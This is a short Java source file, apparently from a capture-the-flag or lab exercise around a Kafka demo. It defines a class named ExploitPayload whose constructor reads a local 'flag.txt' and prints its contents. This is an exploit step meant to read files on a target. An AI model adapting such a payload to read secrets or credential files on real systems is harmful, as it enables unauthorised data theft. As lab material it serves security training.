package com.example.kafkademo;

import java.io.*;

public class ExploitPayload {
    public ExploitPayload() {
        try {
            BufferedReader reader = new BufferedReader(new FileReader("flag.txt"));
            String line;
            System.out.println("[EXPLOIT] flag.txt content:");
            while ((line = reader.readLine()) != null) {
                System.out.println("[FLAG] " + line);
            }
        } catch (IOException e) {
            System.out.println("[ERROR] Failed to read flag.txt");
        }
    }
}